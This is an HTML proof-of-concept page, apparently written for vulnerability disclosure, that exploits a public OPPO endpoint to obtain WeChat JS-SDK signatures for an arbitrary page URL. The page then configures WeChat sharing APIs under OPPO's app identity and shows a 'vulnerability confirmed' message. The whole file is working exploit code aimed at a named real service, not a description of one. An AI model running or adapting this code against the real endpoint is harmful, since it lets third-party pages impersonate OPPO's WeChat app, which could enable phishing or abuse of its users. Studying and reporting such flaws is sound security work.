<!DOCTYPE html>
<html>
<head>
  <title>JSSDK PoC</title>
  <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
</head>
<body>
  <p id="result">初始化中...</p>
  <script>
    const pageUrl = location.href.split('#')[0];

    fetch('https://supervooc.oppo.cn/pp/api/public/wxChatScan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'url=' + encodeURIComponent(pageUrl) + '&type=3'
    })
    .then(r => r.json())
    .then(res => {
      const d = res.data;
      document.getElementById('result').innerText = '获取签名成功，配置中...';

      wx.config({
        debug: true,
        appId: d.appId,
        timestamp: d.timestamp,
        nonceStr: d.nonceStr,
        signature: d.signature,
        jsApiList: ['updateAppMessageShareData', 'onMenuShareTimeline']
      });

      wx.ready(function() {
        document.getElementById('result').innerText
          = '✅ wx.ready() 触发 — 漏洞确认';
      });

      wx.error(function(err) {
        document.getElementById('result').innerText
          = '❌ wx.error: ' + err.errMsg;
      });
    });
  </script>
</body>
</html>
